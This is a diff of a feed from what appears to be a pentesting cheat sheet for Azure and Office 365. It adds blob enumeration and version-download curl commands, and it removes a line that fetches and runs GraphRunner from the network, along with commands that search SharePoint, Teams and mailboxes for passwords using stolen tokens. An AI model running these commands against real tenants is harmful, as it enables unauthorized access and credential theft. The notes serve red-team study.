@@ -51,6 +51,15 @@ python3 omnispray.py -m o365_enum_office -d example.com -uf ~/Documents/userList
 &lt;/code>&lt;/pre>&lt;p>Checking Azure MFA (Assuming Credentials are obtained)&lt;/p>
 &lt;pre tabindex="0">&lt;code>Github: https://github.com/dafthack/MFASweep
 Invoke-MFASweep -Username &amp;lt;Username&amp;gt; -Password &amp;lt;password&amp;gt; -Recon -IncludeADFS
+&lt;/code>&lt;/pre>&lt;p>Blob Enumeration&lt;/p>
+&lt;pre tabindex="0">&lt;code>Format
+https://&amp;lt;storageAccount&amp;gt;.blob.core.windows.net/&amp;lt;containername&amp;gt;/file.txt
+//List Directories in Blob
+https://&amp;lt;storageAccount&amp;gt;.blob.core.windows.net/&amp;lt;containername&amp;gt;?restype=container&amp;amp;comp=list&amp;amp;delimiter=%2F
+//Check for Versioning in blob
+curl -H &amp;#34;x-ms-version: 2019-12-12&amp;#34; &amp;#39;https://&amp;lt;storageAccount&amp;gt;.blob.core.windows.net/&amp;lt;containername&amp;gt;?restype=container&amp;amp;comp=list&amp;amp;include=versions&amp;#39; | xmllint --format - | less
+//Download Potential Files (assuming versioning is enabled)
+curl -H &amp;#34;x-ms-version: 2019-12-12&amp;#34; &amp;#39;https://&amp;lt;storageAccount&amp;gt;.blob.core.windows.net/&amp;lt;containername&amp;gt;/file.zip?versionId=&amp;lt;VersionID&amp;gt;&amp;#39; --output file.zip
 &lt;/code>&lt;/pre>&lt;/div>
 &lt;/div>
 &lt;/div>
@@ -59,17 +68,4 @@ Invoke-MFASweep -Username &amp;lt;Username&amp;gt; -Password &amp;lt;password&am
 &lt;div class="item">
 &lt;h5 class="note-title">&lt;span>Post Exploitation&lt;/span>&lt;/h5>
 &lt;div class="card">
-&lt;div class="card-body">&lt;p>GraphRunner to enumerate Office Products&lt;/p>
-&lt;pre tabindex="0">&lt;code>IEX (iwr &amp;#39;https://raw.githubusercontent.com/dafthack/GraphRunner/main/GraphRunner.ps1&amp;#39;)
-Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm &amp;#39;password filetype:xlsx&amp;#39;
-Invoke-SearchTeams -Tokens $tokens -SearchTerm password
-Invoke-SearchMailbox -Tokens $tokens -SearchTerm &amp;#34;password&amp;#34; -MessageCount 50
-&lt;/code>&lt;/pre>&lt;/div>
-&lt;/div>
-&lt;/div>
-&lt;/div>
-&lt;div class="note-card ">
-&lt;div class="item">
-&lt;h5 class="note-title">&lt;span>Az and Graph Powershell Modules&lt;/span>&lt;/h5>
-&lt;div class="card">
-&lt;div class="card-body">&lt;p>Setup Az and Graph Powershell Modules&lt;/p></description></item></channel></rss>
+&lt;div class="card-body">&lt;p>GraphRunner to enumerate Office Products&lt;/p></description></item></channel></rss>
